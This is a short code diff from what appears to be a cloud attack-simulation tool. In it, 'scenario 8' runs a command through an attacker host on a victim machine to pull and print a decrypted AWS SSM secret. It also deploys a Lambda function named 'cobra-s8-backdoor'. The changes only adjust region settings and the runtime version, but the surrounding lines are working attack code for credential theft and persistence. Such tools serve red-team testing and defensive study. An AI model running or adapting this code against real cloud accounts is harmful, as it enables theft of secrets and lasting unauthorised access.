@@ -143,9 +143,9 @@ def scenario_8_execute(manual=False):
     loading_animation()
     ssm_cmd = (
         f"python3 -c \"import boto3; "
-        f"c=boto3.client('ssm'); "
+        f"c=boto3.client('ssm', region_name='{region}'); "
         f"r=c.get_parameter(Name='{ssm_name}', WithDecryption=True); "
-        f"print(r['Parameter']['Value'])\""
+        f"print(r[\\\"Parameter\\\"][\\\"Value\\\"])\""
     )
     ssm_out = _run_via_attacker(attacker_ip, victim_ip, ssm_cmd)
     print(colored(f"  Secret: {ssm_out[:100]}", color="green"))
@@ -161,9 +161,9 @@ buf = io.BytesIO()
 with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
     z.writestr('index.py', code.decode())
 buf.seek(0)
-boto3.client('lambda').create_function(
+boto3.client('lambda', region_name='{region}').create_function(
     FunctionName='cobra-s8-backdoor',
-    Runtime='python3.9',
+    Runtime='python3.11',
     Role='{lambda_role_arn}',
     Handler='index.handler',
     Code={{'ZipFile': buf.read()}}
